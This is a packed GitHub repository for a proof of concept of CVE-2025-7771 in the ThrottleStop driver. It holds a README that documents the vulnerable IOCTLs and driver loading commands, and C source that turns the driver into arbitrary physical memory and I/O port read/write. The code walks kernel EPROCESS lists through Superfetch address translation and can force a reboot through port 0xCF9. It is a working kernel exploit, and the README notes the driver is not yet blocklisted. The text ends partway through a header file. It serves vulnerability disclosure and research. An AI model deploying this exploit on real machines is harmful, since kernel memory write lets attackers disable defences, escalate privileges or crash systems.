Project Path: arc_U65535F_ThrottleStopPoC_g6uqu3qx

Source Tree:

```txt
arc_U65535F_ThrottleStopPoC_g6uqu3qx
├── Drivers
│   ├── ThrottleStop.sys
│   └── ThrottleStop_x86.sys
├── LICENSE
├── README.md
├── meson.build
└── src
    ├── EProcess.c
    ├── EProcess.h
    ├── Exploit.c
    ├── Exploit.h
    ├── Main.c
    ├── vtop.c
    └── vtop.h

```

`LICENSE`:

```
MIT License

Copyright (c) 2025 U65535F

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`README.md`:

```md
# ThrottleStopPoC
**CVE-2025-7771**: Arbitrary physical memory and I/O port read/write via ThrottleStop driver

ThrottleStop is a small legitimate application used to monitor and correct CPU throttling. It has a driver that faciliates these tasks and it mostly doesn't have any sort of input validation.

## Vulnerable IOCTLs
| IOCTL         | Vulnerability             |
| --------------| --------------------------|
| 0x80006498    | Arbitrary memory read     |
| 0x8000649C    | Arbitrary memory write    |
| 0x80006430    | Arbitrary port read       |
| 0x80006434    | Arbitrary port write      |

There also seems to be arbitrary MSR read and write but I wasn't able to get them working.
Feel free to look it yourself.
Read MSR is at `0x80006448` and write at `0x8000644C`.

If you were able to get it working, please submit an issue describing the procedure.

---
> All of the IOCTL calls mentioned below are implemented in [Exploit.c](src/Exploit.c) file. 
---

### Arbitrary memory read
`0x80006498` IOCTL maps any provided physical address into kernel space using `MmMapIoSpace` and reads 1, 2, 4, or 8 bytes from it. The data is then copied back into user space. 

To trigger this IOCTL, `DeviceIoControl` with physical address as input and output buffer size as read size (1, 2, 4, or 8).

Simplified code for this IOCTL in driver:
```cpp
case 0x80006498: {
    size_t readSize = inputBuffer->Size;   // must be 1,2,4,8
    PHYSICAL_ADDRESS physAddr = inputBuffer->PhysAddr;
    void* mappedAddr = MmMapIoSpace(physAddr, readSize, MmNonCached);

    if (mappedAddr) {
        if (readSize == 1)
            *outputBuffer = *(uint8_t*)mappedAddr;
        else if (readSize == 2)
            *(uint16_t*)outputBuffer = *(uint16_t*)mappedAddr;
        else if (readSize == 4)
            *(uint32_t*)outputBuffer = *(uint32_t*)mappedAddr;
        else if (readSize == 8)
            *(uint64_t*)outputBuffer = *(uint64_t*)mappedAddr;

        MmUnmapIoSpace(mappedAddr, readSize);
    }
}
```

### Arbitrary memory write
Similar to read, `0x8000649C` IOCTL maps provided physical address into kernel space using `MmMapIoSpace` and reads 1, 2, 4, or 8 bytes from it.

To trigger this IOCTL, `DeviceIoControl` with the following input buffer layout:
```cpp
struct {
    ULONGLONG PhysicalAddress;  // 8 bytes
    union {
        BYTE  Value8;
        WORD  Value16;
        DWORD Value32;
        QWORD Value64;
    };
};
```
Input buffer size will be 8 + (1, 2, 4, or 8) depending on write size.

Output buffer and output buffer size are unused.

Simplified code for this IOCTL in driver:
```cpp
case 0x8000649C: {
    size_t writeSize = inputBuffer->Size;  // must be 1,2,4,8
    PHYSICAL_ADDRESS physAddr = inputBuffer->PhysAddr;
    void* mappedAddr = MmMapIoSpace(physAddr, writeSize, MmNonCached);

    if (mappedAddr) {
        if (writeSize == 1)
            *(uint8_t*)mappedAddr = inputBuffer->Value8;
        else if (writeSize == 2)
            *(uint16_t*)mappedAddr = inputBuffer->Value16;
        else if (writeSize == 4)
            *(uint32_t*)mappedAddr = inputBuffer->Value32;
        else if (writeSize == 8)
            *(uint64_t*)mappedAddr = inputBuffer->Value64;

        MmUnmapIoSpace(mappedAddr, writeSize);
    }
}
```

### Arbitrary port read
`0x80006430` IOCTL allows a user to specify an IO port and read from it directly using `__inbyte`, `__inword`, or `__indword`.

Input buffer is a `USHORT` and Input buffer size should be `sizeof(USHORT)`.

Output buffer will hold the result (1, 2, or 4 bytes depending on requested size) and output size can be 1, 2, or 4.

Simplified code for this IOCTL in driver:
```cpp
case 0x80006430: {
    uint16_t port = inputBuffer->PortNumber;
    uint8_t size  = inputBuffer->AccessSize; // 1, 2, or 4

    if (size == 1)
        *outputBuffer = __inbyte(port);
    else if (size == 2)
        *(uint16_t*)outputBuffer = __inword(port);
    else if (size == 4)
        *(uint32_t*)outputBuffer = __indword(port);
}
```

### Arbitrary port write
Similar to port read, `0x80006434` IOCTL allows a user to specify an IO port and write arbitrary values to it with `__outbyte`, `__outword`, or `__outdword`.
The input buffer layout is:
```cpp
struct {
    USHORT PortNumber;
    BYTE   Padding[2];   // alignment
    union {
        BYTE  Value8;
        WORD  Value16;
        DWORD Value32;
    };
};
```
Input buffer size should be sizeof(USHORT) + sizeof(Value) (+ padding).
Output buffer and its size are unused.

Simplified code for this IOCTL in driver:
```cpp
case 0x80006434: {
    uint16_t port = inputBuffer->PortNumber;
    uint8_t size  = inputBuffer->AccessSize; // 1, 2, or 4

    if (size == 1)
        __outbyte(port, inputBuffer->Value8);
    else if (size == 2)
        __outword(port, inputBuffer->Value16);
    else if (size == 4)
        __outdword(port, inputBuffer->Value32);
}
```
---

### Translation of virtual addresses to physical addresses
This translation is possible by abusing Superfetch, a legitimate kernel module that exposes virtual to physical address translation using undocumented APIs.
The code for this is implemented in [vtop.c](src/vtop.c)

## Build 
This project can be compiled using Meson. It reads the `UniqueProcessId` field by resolving the EPROCESS structure of the System process using `PsInitialSystemProcess` and checks if it's `4` (imeplemented in [Main.c](src/Main.c) and the functions for finding EPROCESS of a specific PID are implemented in [EProcess.c](src/EProcess.c)). Additionally, it asks the user if they want to force-restart their system. This is possible by writing `0x0E` value to port `0xCF9`.

> **Warning**: Everything was tested on **Windows 11 build 24H2**. The offsets in the EPROCESS structure might be different on your system.

Build the project by
```
meson setup build
```
It will create the build directory. Now compile the project with
```
meson compile -C build
```

The driver is available at `Drivers` directory of the repository. ThrottleStop drivers can be directly extracted from `ThrottleStop.exe` program via Resource Hacker. You'll find 2 drivers - x64 and x86. `DriverObject->MajorFunction[14]` holds the dispatch function where all the IOCTLs have been implemented.

Create and start driver using:
```
sc create ThrottleStop binPath="<Path>" type=kernel
sc start ThrottleStop
```

## References
https://github.com/jonomango/superfetch

This driver hasn't yet been added to Microsoft driver block list nor [loldrivers](https://loldrivers.io).

```

`meson.build`:

```build
project(
    'ThrottleStopPoC', 
    'c',
    default_options: [
        'warning_level=3',
        'c_std=c11',
        'buildtype=release',
        'strip=true' 
    ]
)

sources = files(
    'src/EProcess.c',
    'src/Exploit.c',
    'src/Main.c',
    'src/vtop.c'
)

executable(
    'ThrottleStopPoC', 
    sources,
    include_directories: include_directories('src/')
)
```

`src/EProcess.c`:

```c
#include "EProcess.h"

ULONGLONG ResolvePsInitialSystemProcessOffset() {
    HMODULE hKernel = LoadLibraryW(L"ntoskrnl.exe");
    if (!hKernel)
        return 0;

    ULONGLONG PsInitialSystemProcessOffset = (ULONGLONG)GetProcAddress(hKernel, "PsInitialSystemProcess");
    if (!PsInitialSystemProcessOffset)
        return 0;

    return (PsInitialSystemProcessOffset - (ULONGLONG)hKernel);
}

ULONGLONG ResolveKernelBaseAddress() {
    ULONGLONG driverBasesAddresses[1024];
    DWORD bytesNeeded;

    if (EnumDeviceDrivers((LPVOID*)driverBasesAddresses, sizeof(driverBasesAddresses), &bytesNeeded) == FALSE)
        return 0;

    return (ULONGLONG)driverBasesAddresses[0];
}

ULONGLONG ResolveSystemProcessBase() {
    ULONGLONG PsInitialSystemProcessOffset = ResolvePsInitialSystemProcessOffset();
    if (!PsInitialSystemProcessOffset)
        return 1;

    ULONGLONG KernelBase = ResolveKernelBaseAddress();
    if (!KernelBase)
        return 1;

    ULONGLONG BaseAddress = 0;
    if (!ReadPhysicalMemoryQword(vtop(KernelBase + PsInitialSystemProcessOffset), &BaseAddress))
        return 0;

    return BaseAddress;
}

ULONGLONG GetEprocessFromPid(DWORD pid) {
    ULONGLONG systemEprocess = ResolveSystemProcessBase();
    if (!systemEprocess)
        return 0;

    ULONGLONG listHead = systemEprocess + EP_ACTIVELINKS_OFFSET, listEntry = 0, current = systemEprocess;
    if (!ReadPhysicalMemoryQword(vtop(listHead), &listEntry))
        return 0;

    do {
        ULONGLONG uniqueProcessId = 0;
        if (!ReadPhysicalMemoryQword(vtop(current + EP_UNIQUEPID_OFFSET), &uniqueProcessId))
            return 0;

        if ((DWORD)uniqueProcessId == pid)
            return current;

        ULONGLONG NextListEntry = 0;
        if (!ReadPhysicalMemoryQword(vtop(current + EP_ACTIVELINKS_OFFSET), &NextListEntry))
            return 0;

        current = NextListEntry - EP_ACTIVELINKS_OFFSET;
    } while (current != systemEprocess);
    return 0;
}
```

`src/EProcess.h`:

```h
#pragma once
#include "vtop.h"
#include "Exploit.h"
#include <PsApi.h>

#define EP_UNIQUEPID_OFFSET   0x1D0ULL
#define EP_ACTIVELINKS_OFFSET 0x1D8ULL

ULONGLONG GetEprocessFromPid(DWORD pid);
```

`src/Exploit.c`:

```c
#include "Exploit.h"

BOOL ReadPhysicalMemory(ULONGLONG physicalAddress, PVOID buffer, SIZE_T size)
{
    if (g_hDevice == INVALID_HANDLE_VALUE || size > 8)
        return FALSE;

    DWORD bytesReturned = 0;
    BOOL result = DeviceIoControl(g_hDevice, THROTTLESTOP_IOCTL_READ_MEMORY, &physicalAddress, sizeof(physicalAddress), buffer, (DWORD)size, &bytesReturned, NULL);

    return (result && bytesReturned == size);
}

BOOL ReadPhysicalMemoryByte(ULONGLONG physicalAddress, PBYTE value) {
    return ReadPhysicalMemory(physicalAddress, value, sizeof(BYTE));
}

BOOL ReadPhysicalMemoryWord(ULONGLONG physicalAddress, PWORD value) {
    return ReadPhysicalMemory(physicalAddress, value, sizeof(WORD));
}

BOOL ReadPhysicalMemoryDword(ULONGLONG physicalAddress, PDWORD value) {
    return ReadPhysicalMemory(physicalAddress, value, sizeof(DWORD));
}

BOOL ReadPhysicalMemoryQword(ULONGLONG physicalAddress, PULONGLONG value) {
    return ReadPhysicalMemory(physicalAddress, value, sizeof(ULONGLONG));
}

BOOL WritePhysicalMemory(ULONGLONG physicalAddress, PVOID buffer, SIZE_T size)
{
    if (g_hDevice == INVALID_HANDLE_VALUE || size > 8)
        return FALSE;

#define QWORD_SIZE 8
    BYTE inputBuffer[sizeof(ULONGLONG) + QWORD_SIZE] = { 0 };
    memcpy(inputBuffer, &physicalAddress, sizeof(physicalAddress));
    memcpy(inputBuffer + sizeof(physicalAddress), buffer, size);

    DWORD bytesReturned = 0;
    DWORD inputBufferSize = sizeof(ULONGLONG) + (DWORD)size;

    BOOL result = DeviceIoControl(g_hDevice, THROTTLESTOP_IOCTL_WRITE_MEMORY, inputBuffer, inputBufferSize, NULL, 0, &bytesReturned, NULL);

    return (result && bytesReturned == 0);
}

BOOL WritePhysicalMemoryByte(ULONGLONG physicalAddress, BYTE value) {
    return WritePhysicalMemory(physicalAddress, &value, sizeof(BYTE));
}

BOOL WritePhysicalMemoryWord(ULONGLONG physicalAddress, WORD value) {
    return WritePhysicalMemory(physicalAddress, &value, sizeof(WORD));
}

BOOL WritePhysicalMemoryDword(ULONGLONG physicalAddress, DWORD value) {
    return WritePhysicalMemory(physicalAddress, &value, sizeof(DWORD));
}

BOOL WritePhysicalMemoryQword(ULONGLONG physicalAddress, ULONGLONG value) {
    return WritePhysicalMemory(physicalAddress, &value, sizeof(ULONGLONG));
}

BOOL ReadIoPortByte(USHORT port, PBYTE value) {
    USHORT inputBuffer = port;
    BYTE outputBuffer = 0;
    DWORD bytesReturned = 0;

    if (!DeviceIoControl(g_hDevice, THROTTLESTOP_IOCTL_READ_IO_PORT, &inputBuffer, sizeof(inputBuffer), &outputBuffer, sizeof(outputBuffer), &bytesReturned, NULL))
        return FALSE;

    if (bytesReturned != sizeof(outputBuffer))
        return FALSE;

    *value = outputBuffer;
    return TRUE;
}

BOOL ReadIoPortWord(USHORT port, PWORD value) {
    USHORT inputBuffer = port;
    WORD outputBuffer = 0;
    DWORD bytesReturned = 0;

    if (!DeviceIoControl(g_hDevice, THROTTLESTOP_IOCTL_READ_IO_PORT, &inputBuffer, sizeof(inputBuffer), &outputBuffer, sizeof(outputBuffer), &bytesReturned, NULL))
        return FALSE;

    if (bytesReturned != sizeof(outputBuffer))
        return FALSE;

    *value = outputBuffer;
    return TRUE;
}

BOOL ReadIoPortDword(USHORT port, PDWORD value) {
    USHORT inputBuffer = port;
    DWORD outputBuffer = 0;
    DWORD bytesReturned = 0;

    if (!DeviceIoControl(g_hDevice, THROTTLESTOP_IOCTL_READ_IO_PORT, &inputBuffer, sizeof(inputBuffer), &outputBuffer, sizeof(outputBuffer), &bytesReturned, NULL))
        return FALSE;

    if (bytesReturned != sizeof(outputBuffer))
        return FALSE;

    *value = outputBuffer;
    return TRUE;
}

BOOL ReadIoPort(USHORT port, PDWORD value, SIZE_T size) {
    switch (size) {
    case 1: {
        BYTE tmp;
        if (!ReadIoPortByte(port, &tmp)) return FALSE;
        *value = tmp;
        return TRUE;
    }
    case 2: {
        WORD tmp;
        if (!ReadIoPortWord(port, &tmp)) return FALSE;
        *value = tmp;
        return TRUE;
    }
    case 4:
        return ReadIoPortDword(port, value);
    default:
        return FALSE;
    }
}

BOOL WriteIoPortByte(USHORT port, BYTE value) {
    struct {
        USHORT port;
        BYTE unused[2];
        BYTE value;
    } inputBuffer = { port, {0, 0}, value };

    DWORD bytesReturned = 0;

    return DeviceIoControl(g_hDevice, THROTTLESTOP_IOCTL_WRITE_IO_PORT, &inputBuffer, sizeof(inputBuffer), NULL, 0, &bytesReturned, NULL);
}

BOOL WriteIoPortWord(USHORT port, WORD value) {
    struct {
        USHORT port;
        BYTE unused[2];
        WORD value;
    } inputBuffer = { port, {0, 0}, value };

    DWORD bytesReturned = 0;

    return DeviceIoControl(g_hDevice, THROTTLESTOP_IOCTL_WRITE_IO_PORT, &inputBuffer, sizeof(inputBuffer), NULL, 0, &bytesReturned, NULL);
}

BOOL WriteIoPortDword(USHORT port, DWORD value) {
    struct {
        USHORT port;
        BYTE unused[2];
        DWORD value;
    } inputBuffer = { port, {0, 0}, value };

    DWORD bytesReturned = 0;

    return DeviceIoControl(g_hDevice, THROTTLESTOP_IOCTL_WRITE_IO_PORT, &inputBuffer, sizeof(inputBuffer), NULL, 0, &bytesReturned, NULL);
}

BOOL WriteIoPort(USHORT port, DWORD value, SIZE_T size) {
    switch (size) {
    case 1: return WriteIoPortByte(port, (BYTE)value);
    case 2: return WriteIoPortWord(port, (WORD)value);
    case 4: return WriteIoPortDword(port, (DWORD)value);
    default: return FALSE;
    }
}
```

`src/Exploit.h`:

```h
#pragma once
#include <Windows.h>

extern HANDLE g_hDevice;
#define DEVICE_NAME L"\\\\.\\ThrottleStop"
#define THROTTLESTOP_IOCTL_READ_MEMORY      0x80006498
#define THROTTLESTOP_IOCTL_WRITE_MEMORY     0x8000649C
#define THROTTLESTOP_IOCTL_READ_IO_PORT     0x80006430
#define THROTTLESTOP_IOCTL_WRITE_IO_PORT    0x80006434


BOOL ReadPhysicalMemoryByte(ULONGLONG physicalAddress, PBYTE value);
BOOL ReadPhysicalMemoryWord(ULONGLONG physicalAddress, PWORD value);
BOOL ReadPhysicalMemoryDword(ULONGLONG physicalAddress, PDWORD value);
BOOL ReadPhysicalMemoryQword(ULONGLONG physicalAddress, PULONGLONG value);

BOOL WritePhysicalMemoryByte(ULONGLONG physicalAddress, BYTE value);
BOOL WritePhysicalMemoryWord(ULONGLONG physicalAddress, WORD value);
BOOL WritePhysicalMemoryDword(ULONGLONG physicalAddress, DWORD value);
BOOL WritePhysicalMemoryQword(ULONGLONG physicalAddress, ULONGLONG value);

BOOL ReadIoPortByte(USHORT port, PBYTE value);
BOOL ReadIoPortWord(USHORT port, PWORD value);
BOOL ReadIoPortDword(USHORT port, PDWORD value);
BOOL ReadIoPort(USHORT port, PDWORD value, SIZE_T size);

BOOL WriteIoPortByte(USHORT port, BYTE value);
BOOL WriteIoPortWord(USHORT port, WORD value);
BOOL WriteIoPortDword(USHORT port, DWORD value);
BOOL WriteIoPort(USHORT port, DWORD value, SIZE_T size);

```

`src/Main.c`:

```c
#include "EProcess.h"
#include <stdio.h>

HANDLE g_hDevice = INVALID_HANDLE_VALUE;

BOOL IsElevated() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        printf("Error: OpenProcessToken failed (code: %lu)\n", GetLastError());
        ExitProcess(1);
    }
    TOKEN_ELEVATION elevation;
    DWORD size = sizeof(TOKEN_ELEVATION);
    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
        CloseHandle(hToken);
        printf("Error: GetTokenInformation failed (code: %lu)\n", GetLastError());
        ExitProcess(1);
    }

    CloseHandle(hToken);
    return elevation.TokenIsElevated;
}

int main() {
    if (!IsElevated()) {
        printf("This program requires elevated privileges. Please run as administrator.\n");
        return 1;
    }

    g_hDevice = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (g_hDevice == INVALID_HANDLE_VALUE) {
        printf("Error: Failed to open ThrottleStop device handle using CreateFileW (code: %lu)\n", GetLastError());
        return 1;
    }

    NTSTATUS status = BuildMemoryMap();
    if (!NT_SUCCESS(status)) {
        printf("Failed to build memory map: 0x%X\n", status);
        CloseHandle(g_hDevice);
        return 1;
    }

    ULONGLONG systemEPROCESS = GetEprocessFromPid(4);
    if (systemEPROCESS == 0) {
        printf("Failed to get EPROCESS for system process.\n");
        FreeMemoryMaps();
        CloseHandle(g_hDevice);
        return 1;
    }

    const int UniqueProcessId = 0x1D0;
    DWORD systemProcessId = 0;
    if (!ReadPhysicalMemoryDword(vtop(systemEPROCESS + UniqueProcessId), &systemProcessId)) {
        printf("Failed to read UniqueProcessId from system process.\n");
        FreeMemoryMaps();
        CloseHandle(g_hDevice);
        return 1;
    }

    printf("System process ID obtained from EPROCESS: %lu\n", systemProcessId);
    printf("System process ID %s match expected value.\n", (systemProcessId == 4) ? "does" : "doesn't");

    printf("\nDo you want to force restart the system? (y/n): ");
    char ch;
    scanf_s("%c", &ch, 1);
    if (ch == 'y' || ch == 'Y') {
        WriteIoPortByte(0xCF9, 0x0E);
		printf("Restart command sent. You are not supposed to see this, if you are then there's something off.\n");
    }

    FreeMemoryMaps();
    CloseHandle(g_hDevice);
    return 0;
}

```

`src/vtop.c`:

```c
#include "vtop.h"

typedef struct MemoryRange {
    ULONGLONG pfn;
    size_t pageCount;
} MemoryRange;

typedef struct MemoryTranslation {
    const void* virtualAddress;
    ULONGLONG physicalAddress;
} MemoryTranslation;

static MemoryRange* g_MemoryRanges = NULL;
static size_t g_MemoryRangeCount = 0;
static size_t g_MemoryRangeCapacity = 0;

static MemoryTranslation* g_MemoryTranslations = NULL;
static size_t g_MemoryTranslationCount = 0;
static size_t g_MemoryTranslationCapacity = 0;

BOOL EnsureMemoryRangeCapacity(size_t required) {
    if (required <= g_MemoryRangeCapacity)
        return TRUE;

    size_t newCapacity = g_MemoryRangeCapacity ? g_MemoryRangeCapacity * 2 : 128;
    while (newCapacity < required)
        newCapacity *= 2;

    MemoryRange* newPtr;
    if (g_MemoryRanges == NULL)
        newPtr = (MemoryRange*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, newCapacity * sizeof(MemoryRange));
    else
        newPtr = (MemoryRange*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, g_MemoryRanges, newCapacity * sizeof(MemoryRange));
    if (!newPtr) 
        return FALSE;

    g_MemoryRanges = newPtr;
    g_MemoryRangeCapacity = newCapacity;
    return TRUE;
}

BOOL EnsureMemoryTranslationCapacity(size_t required) {
    if (required <= g_MemoryTranslationCapacity)
        return TRUE;

    size_t newCapacity = g_MemoryTranslationCapacity ? g_MemoryTranslationCapacity * 2 : 1024;
    while (newCapacity < required)
        newCapacity *= 2;

    MemoryTranslation* newPtr;
    if (g_MemoryTranslations == NULL)
        newPtr = (MemoryTranslation*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, newCapacity * sizeof(MemoryTranslation));
    else
        newPtr = (MemoryTranslation*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, g_MemoryTranslations, newCapacity * sizeof(MemoryTranslation));
    if (!newPtr) return FALSE;

    g_MemoryTranslations = newPtr;
    g_MemoryTranslationCapacity = newCapacity;
    return TRUE;
}


NTSTATUS AcquireRequiredPrivileges() {
    BOOLEAN old = FALSE;
    NTSTATUS status = RtlAdjustPrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE, TRUE, FALSE, &old);
    if (!NT_SUCCESS(status))
        return status;

    status = RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &old);
    if (!NT_SUCCESS(status))
        return status;

    return status;
}

NTSTATUS QuerySuperfetchInfo(SUPERFETCH_INFORMATION_CLASS infoClass, PVOID buffer, ULONG length, PULONG returnLength) {
    SUPERFETCH_INFORMATION superfetchInfo = {
        .Version = 45,
        .Magic = 'kuhC',
        .InfoClass = infoClass,
        .Data = buffer,
        .Length = length
    };

    return NtQuerySystemInformation(SystemSuperfetchInformation, &superfetchInfo, sizeof(superfetchInfo), returnLength);
}


static NTSTATUS QueryMemoryRangesV1() {
    ULONG bufferLength = 0;
    PF_MEMORY_RANGE_INFO_V1 probe = { .Version = 1 };
    NTSTATUS status = QuerySuperfetchInfo(SuperfetchMemoryRangesQuery, &probe, sizeof(probe), &bufferLength);
    if (status != STATUS_BUFFER_TOO_SMALL)
        return status;

    PF_MEMORY_RANGE_INFO_V1* memoryRangeInfo = (PF_MEMORY_RANGE_INFO_V1*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferLength);
    if (!memoryRangeInfo)
        return STATUS_MEMORY_NOT_ALLOCATED;

    memoryRangeInfo->Version = 1;
    status = QuerySuperfetchInfo(SuperfetchMemoryRangesQuery, memoryRangeInfo, bufferLength, NULL);
    if (!NT_SUCCESS(status))
        return status;

    g_MemoryRangeCount = 0;
    for (ULONG i = 0; i < memoryRangeInfo->RangeCount; i++) {
        if (!EnsureMemoryRangeCapacity(g_MemoryRangeCount + 1))
            return STATUS_MEMORY_NOT_ALLOCATED;
        g_MemoryRanges[g_MemoryRangeCount].pfn = memoryRangeInfo->Ranges[i].BasePfn;
        g_MemoryRanges[g_MemoryRangeCount].pageCount = memoryRangeInfo->Ranges[i].PageCount;
        g_MemoryRangeCount++;
    }

    HeapFree(GetProcessHeap(), 0, memoryRangeInfo);
    return STATUS_SUCCESS;
}

static NTSTATUS QueryMemoryRangesV2() {
    ULONG bufferLength = 0;

    PF_MEMORY_RANGE_INFO_V2 probe = { .Version = 2 };
    NTSTATUS status = QuerySuperfetchInfo(SuperfetchMemoryRangesQuery, &probe, sizeof(probe), &bufferLength);
    if (status != STATUS_BUFFER_TOO_SMALL)
        return status;

    PF_MEMORY_RANGE_INFO_V2* memoryRangeInfo = (PF_MEMORY_RANGE_INFO_V2*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferLength);
    if (!memoryRangeInfo)
        return STATUS_MEMORY_NOT_ALLOCATED;

    memoryRangeInfo->Version = 2;
    status = QuerySuperfetchInfo(SuperfetchMemoryRangesQuery, memoryRangeInfo, bufferLength, NULL);
    if (!NT_SUCCESS(status))
        return status;

    g_MemoryRangeCount = 0;
    for (ULONG i = 0; i < memoryRangeInfo->RangeCount; i++) {
        if (!EnsureMemoryRangeCapacity(g_MemoryRangeCount + 1))
            return STATUS_MEMORY_NOT_ALLOCATED;
        g_MemoryRanges[g_MemoryRangeCount].pfn = memoryRangeInfo->Ranges[i].BasePfn;
        g_MemoryRanges[g_MemoryRangeCount].pageCount = memoryRangeInfo->Ranges[i].PageCount;
        g_MemoryRangeCount++;
    }

    HeapFree(GetProcessHeap(), 0, memoryRangeInfo);
    return STATUS_SUCCESS;
}

NTSTATUS BuildMemoryMap() {
    NTSTATUS status = AcquireRequiredPrivileges();
    if (!NT_SUCCESS(status))
        return status;

    if (!NT_SUCCESS(QueryMemoryRangesV1())) {
        status = QueryMemoryRangesV2();
        if (!NT_SUCCESS(status))
            return status;
    }

    g_MemoryTranslationCount = 0;
    for (size_t r = 0; r < g_MemoryRangeCount; r++) {
        ULONGLONG basePfn = g_MemoryRanges[r].pfn;
        size_t pageCount = g_MemoryRanges[r].pageCount;

        size_t bufferLength = sizeof(PF_PFN_PRIO_REQUEST) + sizeof(MMPFN_IDENTITY) * pageCount;
        PF_PFN_PRIO_REQUEST* request = (PF_PFN_PRIO_REQUEST*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferLength);
        if (!request) 
            return STATUS_MEMORY_NOT_ALLOCATED;

        request->Version = request->RequestFlags = 1;
        request->PfnCount = pageCount;

        for (ULONGLONG i = 0; i < pageCount; i++)
            request->PageData[i].PageFrameIndex = basePfn + i;

        status = QuerySuperfetchInfo(SuperfetchPfnQuery, request, (ULONG)bufferLength, NULL);
        if (!NT_SUCCESS(status)) {
            HeapFree(GetProcessHeap(), 0, request);
            return status;
        }

        for (ULONGLONG i = 0; i < pageCount; i++) {
            if (request->PageData[i].u2.VirtualAddress) {
                if (!EnsureMemoryTranslationCapacity(g_MemoryTranslationCount + 1)) {
                    HeapFree(GetProcessHeap(), 0, request);
                    return STATUS_MEMORY_NOT_ALLOCATED;
                }
                g_MemoryTranslations[g_MemoryTranslationCount].virtualAddress = request->PageData[i].u2.VirtualAddress;
                g_MemoryTranslations[g_MemoryTranslationCount].physicalAddress = (basePfn + i) << 12;
                g_MemoryTranslationCount++;
            }
        }
		HeapFree(GetProcessHeap(), 0, request);
    }

    return STATUS_SUCCESS;
}

ULONGLONG vtop(ULONGLONG address) {
    const void* alignedAddress = (const void*)(address & ~0xFFFULL);

    for (size_t i = 0; i < g_MemoryTranslationCount; i++) {
        if (g_MemoryTranslations[i].virtualAddress == alignedAddress)
            return g_MemoryTranslations[i].physicalAddress + (address & 0xFFF);
    }

    return 0;
}

void FreeMemoryMaps() {
    if (g_MemoryRanges) {
        HeapFree(GetProcessHeap(), 0, g_MemoryRanges);
        g_MemoryRanges = NULL;
        g_MemoryRangeCapacity = g_MemoryRangeCount = 0;
    }
    if (g_MemoryTranslations) {
        HeapFree(GetProcessHeap(), 0, g_MemoryTranslations);
        g_MemoryTranslations = NULL;
        g_MemoryTranslationCapacity = g_MemoryTranslationCount = 0;
    }
}

```

`src/vtop.h`:

```h
#pragma once
#define WIN32_NO_STATUS
#include <Windows.h>
#undef WIN32_NO_STATUS

#include <ntstatus.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

typedef enum SUPERFETCH_INFORMATION_CLASS {
    SuperfetchRetrieveTrace = 1,        // Query
    SuperfetchSystemParameters = 2,     // Query
    SuperfetchLogEvent = 3,             // Set
    SuperfetchGenerateTrace = 4,        // Set
    SuperfetchPrefetch = 5,             // Set
    SuperfetchPfnQuery = 6,             // Query
    SuperfetchPfnSetPriority = 7,       // Set
    SuperfetchPrivSourceQuery = 8,      // Query
    SuperfetchSequenceNumberQuery = 9,  // Query
    SuperfetchScenarioPhase = 10,       // Set
    SuperfetchWorkerPriority = 11,      // Set
    SuperfetchScenarioQuery = 12,       // Query
    SuperfetchScenarioPrefetch = 13,    // Set
    SuperfetchRobustnessControl = 14,   // Set
    SuperfetchTimeControl = 15,         // Set
    SuperfetchMemoryListQuery = 16,     // Query
    SuperfetchMemoryRangesQuery = 17,   // Query
    SuperfetchTracingControl = 18,      // Set
    SuperfetchTrimWhileAgingControl = 19,
    SuperfetchInformationMax = 20
} SUPERFETCH_INFORMATION_CLASS;

typedef struct SUPERFETCH_INFORMATION {
    ULONG Version;
    ULONG Magic;
    SUPERFETCH_INFORMATION_CLASS InfoClass;
    PVOID Data;
    ULONG Length;
} SUPERFETCH_INFORMATION;

typedef struct MEMORY_FRAME_INFORMATION {
    ULONGLONG UseDescription : 4;
    ULONGLONG ListDescription : 3;
    ULONGLONG Reserved0 : 1;
    ULONGLONG Pinned : 1;
    ULONGLONG DontUse : 48;
    ULONGLONG Priority : 3;
    ULONGLONG Reserved : 4;
} MEMORY_FRAME_INFORMATION;

typedef struct FILEOFFSET_INFORMATION {
    ULONGLONG DontUse : 9;
    ULONGLONG Offset : 48;
    ULONGLONG Reserved : 7;
} FILEOFFSET_INFORMATION;

typedef struct PAGEDIR_INFORMATION {
    ULONGLONG DontUse : 9;
    ULONGLONG PageDirectoryBase : 48;
    ULONGLONG Reserved : 7;
} PAGEDIR_INFORMATION;

typedef struct UNIQUE_PROCESS_INFORMATION {
    ULONGLONG DontUse : 9;
    ULONGLONG UniqueProcessKey : 48;
    ULONGLONG Reserved : 7;
} UNIQUE_PROCESS_INFORMATION;

typedef struct MMPFN_IDENTITY {
    union {
        MEMORY_FRAME_INFORMATION   e1;
        FILEOFFSET_INFORMATION     e2;
